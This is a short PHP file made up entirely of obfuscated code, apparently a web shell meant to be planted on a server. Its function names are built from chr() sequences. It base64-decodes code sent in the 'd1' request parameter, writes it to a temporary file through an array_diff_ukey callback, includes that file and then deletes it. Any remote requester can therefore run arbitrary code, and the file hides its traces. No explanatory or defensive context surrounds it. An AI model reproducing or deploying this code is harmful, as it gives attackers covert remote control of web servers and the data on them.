<?php $a = chr(95).chr(116).chr(101).chr(109).chr(112).chr(108).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110);$c = chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115);$d = chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$f = chr(60).chr(63).chr(112).chr(104).chr(112).chr(32);$b = $f.$d($_REQUEST[chr(100).chr(49)]);@array_diff_ukey(@array((string)($a) => 1), @array((string)($b) => 2), $c);@include($a);@unlink($a); ?>